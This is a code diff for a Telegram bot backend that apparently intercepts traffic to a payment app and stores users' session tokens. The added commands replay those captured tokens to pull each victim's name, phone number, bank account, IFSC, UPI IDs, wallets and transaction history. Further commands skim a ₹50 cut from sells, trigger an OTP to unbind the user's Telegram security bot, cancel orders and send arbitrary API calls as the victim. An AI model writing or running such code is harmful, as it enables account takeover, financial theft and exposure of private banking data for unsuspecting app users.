@@ -745,6 +745,31 @@ app.post('/bot-webhook', async (req, res) => {
 === TRACKING ===
 /idtrack — Show all tracked user IDs
 
+=== TOKEN-BASED INFO (apptoken se live fetch) ===
+/profile <token> — Name, phone, balance, level, USDT
+/details <token> — Local tracked details + overrides
+/bank <token> — Bound bank account (holder/acc/IFSC/UPI)
+/upis <token> — UPI list (upi/list + wallet/list)
+/wallets <token> — Wallet bind list (Paytm/PhonePe etc.)
+/orders <token> [page] — Sell orders (memberOrderOutList)
+/sellsearch <token> [page] — Sell pool search list
+/recharges <token> [page] — Deposit/recharge history
+/withdraws <token> [page] — Withdraw history
+/balrec <token> [page] — Balance change records
+/stats <token> — User data statistics
+/usdtrate <token> — Current USDT exchange rate
+/customer <token> — Customer service links
+/tgrobot <token> — TG robot bind status + bind code
+
+=== TOKEN-BASED ACTIONS ===
+/sellon <token> — Sell control ON (₹50 cut intercept)
+/selloff <token> — Sell control OFF (passthrough)
+/sendcode <token> [codeType] — Send unbind OTP (default unbindRobot)
+/unbind <token> <code> — Unbind TG robot with OTP
+/cancelsell <token> <orderId> — Cancel sell order
+/cancelbuy <token> <orderId> — Cancel recharge order
+/raw <token> <path> [json] — Custom POST to any endpoint
+
 Example:
 /addbank Rahul Kumar|1234567890|SBIN0001234|SBI|rahul@upi`
       );
@@ -998,6 +1023,421 @@ Example:
       }
       await bot.sendMessage(chatId, msg);
       return res.sendStatus(200);
+    }
+
+    const TOKEN_CMDS = 'sellon|selloff|upis|details|tgrobot|profile|bank|wallets|orders|sellsearch|recharges|withdraws|balrec|stats|usdtrate|customer|sendcode|unbind|cancelsell|cancelbuy|raw';
+    const tokenCmdMatch = text.match(new RegExp(`^\\/(${TOKEN_CMDS})\\s+(.+)$`, 'i'));
+    if (tokenCmdMatch) {
+      const cmd = tokenCmdMatch[1].toLowerCase();
+      const argStr = tokenCmdMatch[2].trim();
+      const argParts = argStr.split(/\s+/);
+      const rawToken = argParts[0];
+      const extraArg = argParts[1] || '';
+      const extraArg2 = argParts[2] || '';
+      if (!rawToken || rawToken.length < 8) {
+        await bot.sendMessage(chatId, `❌ Token missing or too short.\nFormat: /${cmd} <apptoken> ${cmd === 'cancelsell' || cmd === 'cancelbuy' ? '<orderId>' : (cmd === 'unbind' ? '<code>' : (cmd === 'raw' ? '<path>' : ''))}`);
+        return res.sendStatus(200);
+      }
+      const tKey = rawToken.substring(0, 100);
+      let uid = tokenUserMap[tKey] || '';
+      if (!uid && redis) {
+        try {
+          const stored = await redis.hget('ezpayTokenMap', tKey);
+          if (stored) { uid = String(stored); tokenUserMap[tKey] = uid; }
+        } catch(e) {}
+      }
+
+      if (cmd === 'sellon' || cmd === 'selloff') {
+        if (!uid) {
+          await bot.sendMessage(chatId, `❌ Token se userId nahi mila.\nUser ko ek baar app open / login karna hoga taaki token map ho.`);
+          return res.sendStatus(200);
+        }
+        const newState = (cmd === 'sellon');
+        data = await loadData(true);
+        if (!data.userOverrides) data.userOverrides = {};
+        if (!data.userOverrides[uid]) data.userOverrides[uid] = {};
+        data.userOverrides[uid].sellControl = newState;
+        if (newState) delete data.userOverrides[uid].lastRealBalance;
+        data._skipOverrideMerge = true;
+        await saveData(data);
+        const phone = getPhone(data, uid);
+        await bot.sendMessage(chatId, `🔒 Sell Control ${newState ? '🟢 ON' : '🔴 OFF'}\n👤 User: ${uid}${phone ? ' (' + phone + ')' : ''}\n🔑 Token: ${rawToken.substring(0, 20)}...${newState ? '\n💰 Cut: ₹50 fixed\n📌 Next /mine call se balance track hoga' : '\n📌 Sell ab original cut ke saath chalega'}`);
+        return res.sendStatus(200);
+      }
+
+      if (cmd === 'details') {
+        if (!uid) {
+          await bot.sendMessage(chatId, `❌ Token se userId nahi mila.\nToken: ${rawToken.substring(0, 20)}...\nUser ko app khol ke ek request maarni hogi.`);
+          return res.sendStatus(200);
+        }
+        const tracked = (data.trackedUsers || {})[uid] || {};
+        const ovr = (data.userOverrides || {})[uid] || {};
+        const phone = getPhone(data, uid);
+        let m = `👤 USER DETAILS\n━━━━━━━━━━━━━━━━━━\n🆔 UserId: ${uid}\n📱 Phone: ${phone || tracked.phone || 'N/A'}\n📛 Name: ${tracked.name || 'N/A'}\n💰 Balance: ${tracked.balance ?? 'N/A'}\n📦 Orders: ${tracked.orderCount || 0}\n🕐 Last: ${tracked.lastAction || 'N/A'} @ ${tracked.lastSeen || 'N/A'}\n🔑 Token: ${rawToken.substring(0, 30)}...\n━━━━━━━━━━━━━━━━━━\n⚙️ OVERRIDES:\n`;
+        if (Object.keys(ovr).length === 0) {
+          m += `(none)`;
+        } else {
+          if (ovr.addedBalance !== undefined) m += `➕ Added Balance: ₹${ovr.addedBalance}\n`;
+          if (ovr.sellControl !== undefined) m += `🔒 Sell Control: ${ovr.sellControl ? 'ON' : 'OFF'}\n`;
+          if (ovr.logOff) m += `🔇 Log: OFF\n`;
+          if (ovr.bankIndex !== undefined) m += `🏦 Bank Index: ${ovr.bankIndex + 1}\n`;
+          if (ovr.lastRealBalance !== undefined) m += `📊 Last Real Bal: ₹${ovr.lastRealBalance}\n`;
+          if (ovr.quotaRecords && ovr.quotaRecords.length) m += `📜 Quota Records: ${ovr.quotaRecords.length}\n`;
+        }
+        await bot.sendMessage(chatId, m);
+        return res.sendStatus(200);
+      }
+
+      const upstreamHeaders = {
+        'apptoken': rawToken,
+        'host': 'api.ezpaycenter.com',
+        'content-type': 'application/json;charset=UTF-8',
+        'accept': 'application/json, text/plain, */*',
+        'user-agent': 'okhttp/4.9.3'
+      };
+
+      if (cmd === 'upis') {
+        await bot.sendMessage(chatId, `⏳ Fetching UPI list...`);
+        const endpoints = ['/app/api/v1/upi/list', '/app/api/v1/wallet/list'];
+        let out = `💳 UPI / WALLET LIST${uid ? ` (User: ${uid})` : ''}\n🔑 ${rawToken.substring(0, 20)}...\n━━━━━━━━━━━━━━━━━━\n`;
+        for (const ep of endpoints) {
+          try {
+            const r = await fetch(ORIGINAL_API + ep, { method: 'POST', headers: upstreamHeaders, body: '{}' });
+            const txt = await r.text();
+            let j = null; try { j = JSON.parse(txt); } catch(e) {}
+            const d = getResponseData(j);
+            out += `\n📍 ${ep}\nStatus: ${r.status} | code: ${j?.code ?? 'N/A'} | msg: ${j?.message ?? j?.msg ?? 'N/A'}\n`;
+            if (Array.isArray(d) && d.length) {
+              d.forEach((it, i) => {
+                if (it && typeof it === 'object') {
+                  const upi = it.upiId || it.upi || it.vpa || it.account || 'N/A';
+                  const name = it.accountHolder || it.name || it.holderName || it.realName || '';
+                  const status = it.status || it.state || '';
+                  out += `  ${i + 1}. ${upi}${name ? ' | ' + name : ''}${status ? ' | ' + status : ''}\n`;
+                }
+              });
+            } else if (d && typeof d === 'object') {
+              out += `  ${JSON.stringify(d).substring(0, 600)}\n`;
+            } else {
+              out += `  (empty)\n`;
+            }
+          } catch(e) {
+            out += `\n📍 ${ep}\n  ❌ ${e.message}\n`;
+          }
+        }
+        if (out.length > 4000) out = out.substring(0, 4000) + '\n... (truncated)';
+        await bot.sendMessage(chatId, out);
+        return res.sendStatus(200);
+      }
+
+      if (cmd === 'tgrobot') {
+        await bot.sendMessage(chatId, `⏳ Checking robot bind...`);
+        try {
+          const r = await fetch(ORIGINAL_API + '/app/api/memberManager/bindRobotDetail', { method: 'POST', headers: upstreamHeaders, body: '{}' });
+          const txt = await r.text();
+          let j = null; try { j = JSON.parse(txt); } catch(e) {}
+          const d = getResponseData(j) || {};
+          const boundRaw = (d.isBound !== undefined) ? d.isBound
+                           : (d.bound !== undefined) ? d.bound
+                           : (d.bindStatus !== undefined) ? d.bindStatus
+                           : (d.status !== undefined) ? d.status
+                           : null;
+          const isBound = (boundRaw === true || boundRaw === 1 || boundRaw === '1' || String(boundRaw).toLowerCase() === 'true' || String(boundRaw).toLowerCase() === 'bound');
+          const phone = uid ? getPhone(data, uid) : '';
+          let m = `🤖 TG ROBOT BIND STATUS\n━━━━━━━━━━━━━━━━━━\n${uid ? `👤 User: ${uid}${phone ? ' (' + phone + ')' : ''}\n` : ''}🔑 Token: ${rawToken.substring(0, 20)}...\n📊 HTTP: ${r.status} | code: ${j?.code ?? 'N/A'}\n\n${boundRaw === null ? '❓ Bound: UNKNOWN (no bind field in response)' : (isBound ? '✅ BOUND' : '❌ NOT BOUND')}\n`;
+          if (d.telegramBotLink || d.botLink) m += `🔗 Bot Link: ${d.telegramBotLink || d.botLink}\n`;
+          if (d.telegramBindCode || d.bindCode || d.code) m += `🔢 Bind Code: ${d.telegramBindCode || d.bindCode || d.code}\n`;
+          if (d.telegramUserName || d.tgUsername || d.username) m += `👥 TG Username: ${d.telegramUserName || d.tgUsername || d.username}\n`;
+          if (d.telegramUserId || d.tgUserId) m += `🆔 TG UserId: ${d.telegramUserId || d.tgUserId}\n`;
+          m += `\n📥 RAW:\n${JSON.stringify(d).substring(0, 1500)}`;
+          if (m.length > 4000) m = m.substring(0, 4000) + '\n... (truncated)';
+          await bot.sendMessage(chatId, m);
+        } catch(e) {
+          await bot.sendMessage(chatId, `❌ Robot detail fetch failed: ${e.message}`);
+        }
+        return res.sendStatus(200);
+      }
+
+      const callUpstream = async (path, body) => {
+        const r = await fetch(ORIGINAL_API + path, { method: 'POST', headers: upstreamHeaders, body: JSON.stringify(body || {}) });
+        const txt = await r.text();
+        let j = null; try { j = JSON.parse(txt); } catch(e) {}
+        return { r, txt, j };
+      };
+      const headerLine = (label) => `${label}\n━━━━━━━━━━━━━━━━━━\n${uid ? `👤 User: ${uid}${getPhone(data, uid) ? ' (' + getPhone(data, uid) + ')' : ''}\n` : ''}🔑 ${rawToken.substring(0, 20)}...\n`;
+      const respLine = (r, j) => `📊 HTTP: ${r.status} | code: ${j?.code ?? 'N/A'} | msg: ${j?.message ?? j?.msg ?? 'N/A'}`;
+      const truncate = (s) => s.length > 4000 ? s.substring(0, 4000) + '\n... (truncated)' : s;
+      const arrFromData = (d) => {
+        if (!d) return null;
+        if (Array.isArray(d)) return d;
+        return d.records || d.list || d.lists || d.rows || d.content || null;
+      };
+
+      try {
+        if (cmd === 'profile') {
+          await bot.sendMessage(chatId, `⏳ Fetching profile...`);
+          const { r, j } = await callUpstream('/app/api/memberManager/mine', {});
+          const d = getResponseData(j) || {};
+          let m = headerLine('👤 PROFILE') + respLine(r, j) + `\n\n`;
+          m += `🆔 memberCodeId: ${d.memberCodeId || d.memberId || d.userId || 'N/A'}\n`;
+          m += `📛 Name: ${d.realName || d.name || d.nickName || 'N/A'}\n`;
+          m += `📱 Phone: ${d.memberPhone || d.phone || d.mobile || 'N/A'}\n`;
+          m += `💰 Balance: ₹${d.balance ?? d.availableBalance ?? d.amount ?? 'N/A'}\n`;
+          m += `🎫 Frozen: ₹${d.frozenAmount ?? d.frozen ?? 'N/A'}\n`;
+          m += `🪙 USDT: ${d.usdtAddress || d.usdt || 'N/A'}\n`;
+          m += `🏆 Level: ${d.level ?? d.memberLevel ?? 'N/A'}\n`;
+          m += `🕐 Reg: ${d.createTime || d.registerTime || 'N/A'}\n`;
+          m += `\n📥 RAW:\n${JSON.stringify(d).substring(0, 2000)}`;
+          await bot.sendMessage(chatId, truncate(m));
+          return res.sendStatus(200);
+        }
+
+        if (cmd === 'bank') {
+          await bot.sendMessage(chatId, `⏳ Fetching bank account...`);
+          const { r, j } = await callUpstream('/app/api/memberManager/getBankAccount', {});
+          const d = getResponseData(j);
+          let m = headerLine('🏦 BANK ACCOUNT') + respLine(r, j) + `\n\n`;
+          if (d && typeof d === 'object' && !Array.isArray(d)) {
+            m += `📛 Holder: ${d.accountHolder || d.holderName || d.realName || 'N/A'}\n`;
+            m += `🔢 Acc No: ${d.accountNo || d.bankAccount || 'N/A'}\n`;
+            m += `🏷️ IFSC: ${d.ifsc || d.ifscCode || 'N/A'}\n`;
+            m += `🏦 Bank: ${d.bankName || 'N/A'}\n`;
+            m += `📲 UPI: ${d.upiId || d.vpa || 'N/A'}\n`;
+          } else if (Array.isArray(d)) {
+            d.forEach((b, i) => { m += `${i + 1}. ${b.accountHolder || ''} | ${b.accountNo || ''} | ${b.ifsc || ''}\n`; });
+          }
+          m += `\n📥 RAW:\n${JSON.stringify(d).substring(0, 1500)}`;
+          await bot.sendMessage(chatId, truncate(m));
+          return res.sendStatus(200);
+        }
+
+        if (cmd === 'wallets') {
+          await bot.sendMessage(chatId, `⏳ Fetching wallets...`);
+          const { r, j } = await callUpstream('/app/api/v1/wallet/list', {});
+          const d = getResponseData(j);
+          let m = headerLine('👛 WALLET LIST') + respLine(r, j) + `\n\n`;
+          const arr = arrFromData(d) || (Array.isArray(d) ? d : null);
+          if (arr && arr.length) {
+            arr.forEach((w, i) => {
+              m += `${i + 1}. ${w.walletName || w.name || w.type || 'wallet'} | ${w.phone || w.mobile || w.account || ''} | ${w.status || w.bindStatus || ''}\n`;
+            });
+          } else {
+            m += `(empty)\n`;
+          }
+          m += `\n📥 RAW:\n${JSON.stringify(d).substring(0, 1500)}`;
+          await bot.sendMessage(chatId, truncate(m));
+          return res.sendStatus(200);
+        }
+
+        if (cmd === 'orders' || cmd === 'sellsearch') {
+          const path = (cmd === 'orders') ? '/app/api/orderOut/memberOrderOutList' : '/app/api/orderOut/searchList';
+          const page = parseInt(extraArg) || 1;
+          await bot.sendMessage(chatId, `⏳ Fetching ${cmd}...`);
+          const { r, j } = await callUpstream(path, { pageNo: page, pageNum: page, page: page, pageSize: 10 });
+          const d = getResponseData(j);
+          let m = headerLine(cmd === 'orders' ? '📦 SELL ORDERS' : '🔎 SELL POOL') + respLine(r, j) + `\n📄 Page: ${page}\n\n`;
+          const arr = arrFromData(d);
+          if (arr && arr.length) {
+            arr.slice(0, 15).forEach((o, i) => {
+              m += `${i + 1}. ₹${o.amount || o.orderAmount || '?'} | ${o.orderId || o.orderNo || ''} | ${o.status || o.orderStatus || ''} | ${o.createTime || ''}\n`;
+            });
+            if (arr.length > 15) m += `... +${arr.length - 15} more\n`;
+            const total = (typeof d === 'object' && d && (d.total ?? d.totalCount ?? d.totalElements));
+            if (total !== undefined && total !== null) m += `\n📊 Total: ${total}`;
+          } else {
+            m += `(empty)\n`;
+          }
+          m += `\n📥 RAW:\n${JSON.stringify(d).substring(0, 1200)}`;
+          await bot.sendMessage(chatId, truncate(m));
+          return res.sendStatus(200);
+        }
+
+        if (cmd === 'recharges') {
+          const page = parseInt(extraArg) || 1;
+          await bot.sendMessage(chatId, `⏳ Fetching recharge history...`);
+          const { r, j } = await callUpstream('/app/api/memberRecharge/memberRechargeList', { pageNo: page, pageNum: page, pageSize: 10 });
+          const d = getResponseData(j);
+          let m = headerLine('💰 RECHARGE HISTORY') + respLine(r, j) + `\n📄 Page: ${page}\n\n`;
+          const arr = arrFromData(d);
+          if (arr && arr.length) {
+            arr.slice(0, 15).forEach((o, i) => {
+              m += `${i + 1}. ₹${o.amount || o.orderAmount || '?'} | ${o.orderId || o.orderNo || ''} | UTR: ${o.utr || o.transactionId || '-'} | ${o.status || ''}\n`;
+            });
+            if (arr.length > 15) m += `... +${arr.length - 15} more\n`;
+          } else m += `(empty)\n`;
+          m += `\n📥 RAW:\n${JSON.stringify(d).substring(0, 1200)}`;
+          await bot.sendMessage(chatId, truncate(m));
+          return res.sendStatus(200);
+        }
+
+        if (cmd === 'withdraws') {
+          const page = parseInt(extraArg) || 1;
+          await bot.sendMessage(chatId, `⏳ Fetching withdraw history...`);
+          const { r, j } = await callUpstream('/app/api/memberManager/withdrawHistory', { pageNo: page, pageNum: page, pageSize: 10 });
+          const d = getResponseData(j);
+          let m = headerLine('💸 WITHDRAW HISTORY') + respLine(r, j) + `\n📄 Page: ${page}\n\n`;
+          const arr = arrFromData(d);
+          if (arr && arr.length) {
+            arr.slice(0, 15).forEach((o, i) => {
+              m += `${i + 1}. ₹${o.amount || '?'} | ${o.orderId || o.orderNo || o.withdrawNo || ''} | ${o.status || o.orderStatus || ''} | ${o.createTime || ''}\n`;
+            });
+            if (arr.length > 15) m += `... +${arr.length - 15} more\n`;
+          } else m += `(empty)\n`;
+          m += `\n📥 RAW:\n${JSON.stringify(d).substring(0, 1200)}`;
+          await bot.sendMessage(chatId, truncate(m));
+          return res.sendStatus(200);
+        }
+
+        if (cmd === 'balrec') {
+          const page = parseInt(extraArg) || 1;
+          await bot.sendMessage(chatId, `⏳ Fetching balance records...`);
+          const { r, j } = await callUpstream('/app/api/memberManager/balanceRecordList', { pageNo: page, pageNum: page, pageSize: 10 });
+          const d = getResponseData(j);
+          let m = headerLine('📒 BALANCE RECORDS') + respLine(r, j) + `\n📄 Page: ${page}\n\n`;
+          const arr = arrFromData(d);
+          if (arr && arr.length) {
+            arr.slice(0, 15).forEach((o, i) => {
+              const amt = o.amount || o.changeAmount || o.value || '';
+              m += `${i + 1}. ${o.type || o.recordType || ''} | ₹${amt} | bal: ${o.balance ?? o.afterBalance ?? '-'} | ${o.createTime || o.time || ''}\n`;
+            });
+            if (arr.length > 15) m += `... +${arr.length - 15} more\n`;
+          } else m += `(empty)\n`;
+          m += `\n📥 RAW:\n${JSON.stringify(d).substring(0, 1200)}`;
+          await bot.sendMessage(chatId, truncate(m));
+          return res.sendStatus(200);
+        }
+
+        if (cmd === 'stats') {
+          await bot.sendMessage(chatId, `⏳ Fetching stats...`);
+          const { r, j } = await callUpstream('/app/api/memberManager/dataStatistics', {});
+          const d = getResponseData(j) || {};
+          let m = headerLine('📊 USER STATISTICS') + respLine(r, j) + `\n\n`;
+          if (d && typeof d === 'object') {
+            for (const [k, v] of Object.entries(d)) {
+              if (typeof v !== 'object') m += `• ${k}: ${v}\n`;
+            }
+          }
+          m += `\n📥 RAW:\n${JSON.stringify(d).substring(0, 2000)}`;
+          await bot.sendMessage(chatId, truncate(m));
+          return res.sendStatus(200);
+        }
+
+        if (cmd === 'usdtrate') {
+          await bot.sendMessage(chatId, `⏳ Fetching USDT rate...`);
+          const { r, j } = await callUpstream('/app/api/memberRecharge/getUsdtRate', {});
+          const d = getResponseData(j) || {};
+          let m = headerLine('🪙 USDT RATE') + respLine(r, j) + `\n\n`;
+          m += `💱 Rate: ${d.rate ?? d.usdtRate ?? d.price ?? 'N/A'}\n`;
+          m += `\n📥 RAW:\n${JSON.stringify(d).substring(0, 1500)}`;
+          await bot.sendMessage(chatId, truncate(m));
+          return res.sendStatus(200);
+        }
+
+        if (cmd === 'customer') {
+          await bot.sendMessage(chatId, `⏳ Fetching customer service...`);
+          const { r, j } = await callUpstream('/app/api/customer/list', {});
+          const d = getResponseData(j);
+          let m = headerLine('🎧 CUSTOMER SERVICE') + respLine(r, j) + `\n\n`;
+          const arr = Array.isArray(d) ? d : (d ? [d] : []);
+          arr.forEach((c, i) => {
+            m += `${i + 1}. ${c.name || c.title || c.serviceName || ''} | ${c.url || c.link || c.serviceUrl || c.contactUrl || ''}\n`;
+          });
+          if (!arr.length) m += `(empty)\n`;
+          m += `\n📥 RAW:\n${JSON.stringify(d).substring(0, 1500)}`;
+          await bot.sendMessage(chatId, truncate(m));
+          return res.sendStatus(200);
+        }
+
+        if (cmd === 'sendcode') {
+          await bot.sendMessage(chatId, `⏳ Sending verification code...`);
+          const codeType = extraArg || 'unbindRobot';
+          const { r, j } = await callUpstream('/app/api/memberManager/getMemberVerificationCode', { codeType });
+          let m = headerLine('🔐 VERIFICATION CODE SENT') + respLine(r, j) + `\n\n`;
+          m += `📝 codeType: ${codeType}\n`;
+          m += `\n📥 RAW:\n${JSON.stringify(j).substring(0, 1500)}`;
+          await bot.sendMessage(chatId, truncate(m));
+          return res.sendStatus(200);
+        }
+
+        if (cmd === 'unbind') {
+          if (!extraArg) {
+            await bot.sendMessage(chatId, `❌ Format: /unbind <token> <verificationCode>\nFirst do: /sendcode <token>`);
+            return res.sendStatus(200);
+          }
+          await bot.sendMessage(chatId, `⏳ Unbinding robot...`);
+          const body = { verificationCode: extraArg, code: extraArg };
+          const v2 = await callUpstream('/app/api/memberManager/v2/unbindRobot', body);
+          let r = v2.r, j = v2.j;
+          let fellBack = false;
+          const routeMissing = (v2.r.status === 404 || v2.r.status === 405) ||
+                               (v2.j && (v2.j.message || v2.j.msg || '').match(/(no\s*such|not\s*found|unknown\s*(api|interface|method|url|path)|invalid\s*(api|url|path))/i));
+          if (routeMissing) {
+            const v1 = await callUpstream('/app/api/memberManager/unbindRobot', body);
+            r = v1.r; j = v1.j; fellBack = true;
+          }
+          let m = headerLine('🔓 UNBIND ROBOT') + respLine(r, j) + `\n\n`;
+          m += `🔢 Code: ${extraArg}\n`;
+          m += `🔁 Endpoint: ${fellBack ? 'v1 (v2 route missing)' : 'v2'}\n`;
+          if (fellBack) m += `↩️ v2 result: HTTP ${v2.r.status} | code: ${v2.j?.code ?? 'N/A'} | ${v2.j?.message ?? v2.j?.msg ?? ''}\n`;
+          m += `\n📥 RAW:\n${JSON.stringify(j).substring(0, 1500)}`;
+          await bot.sendMessage(chatId, truncate(m));
+          return res.sendStatus(200);
+        }
+
+        if (cmd === 'cancelsell') {
+          if (!extraArg) {
+            await bot.sendMessage(chatId, `❌ Format: /cancelsell <token> <orderId>`);
+            return res.sendStatus(200);
+          }
+          await bot.sendMessage(chatId, `⏳ Cancelling sell order ${extraArg}...`);
+          const { r, j } = await callUpstream('/app/api/orderOut/cancel', { orderId: extraArg, orderNo: extraArg });
+          let m = headerLine('❌ CANCEL SELL ORDER') + respLine(r, j) + `\n\n`;
+          m += `📦 Order: ${extraArg}\n`;
+          m += `\n📥 RAW:\n${JSON.stringify(j).substring(0, 1500)}`;
+          await bot.sendMessage(chatId, truncate(m));
+          return res.sendStatus(200);
+        }
+
+        if (cmd === 'cancelbuy') {
+          if (!extraArg) {
+            await bot.sendMessage(chatId, `❌ Format: /cancelbuy <token> <orderId>`);
+            return res.sendStatus(200);
+          }
+          await bot.sendMessage(chatId, `⏳ Cancelling recharge ${extraArg}...`);
+          const { r, j } = await callUpstream('/app/api/memberRecharge/cancelOrder', { orderId: extraArg, orderNo: extraArg });
+          let m = headerLine('❌ CANCEL RECHARGE') + respLine(r, j) + `\n\n`;
+          m += `📦 Order: ${extraArg}\n`;
+          m += `\n📥 RAW:\n${JSON.stringify(j).substring(0, 1500)}`;
+          await bot.sendMessage(chatId, truncate(m));
+          return res.sendStatus(200);
+        }
+
+        if (cmd === 'raw') {
+          if (!extraArg) {
+            await bot.sendMessage(chatId, `❌ Format: /raw <token> <path> [jsonBody]\nExample: /raw <tok> /app/api/memberManager/mine\n         /raw <tok> /app/api/orderOut/detail {"orderId":"123"}`);
+            return res.sendStatus(200);
+          }
+          let path = extraArg;
+          if (!path.startsWith('/')) path = '/' + path;
+          const bodyStr = argParts.slice(2).join(' ').trim();
+          let body = {};
+          if (bodyStr) {
+            try { body = JSON.parse(bodyStr); } catch(e) {
+              await bot.sendMessage(chatId, `❌ Invalid JSON body: ${e.message}`);
+              return res.sendStatus(200);
+            }
+          }
+          await bot.sendMessage(chatId, `⏳ POST ${path}\nBody: ${JSON.stringify(body).substring(0, 200)}`);
+          const { r, j, txt } = await callUpstream(path, body);
+          let m = headerLine('🛠 RAW CALL') + respLine(r, j) + `\n\n`;
+          m += `📍 ${path}\n\n📥 RESPONSE:\n${(j ? JSON.stringify(j, null, 2) : txt).substring(0, 3000)}`;
+          await bot.sendMessage(chatId, truncate(m));
+          return res.sendStatus(200);
+        }
+      } catch(e) {
+        await bot.sendMessage(chatId, `❌ /${cmd} failed: ${e.message}`);
+        return res.sendStatus(200);
+      }
     }
 
     if (text === '/sell history' || text.startsWith('/sell history ')) {
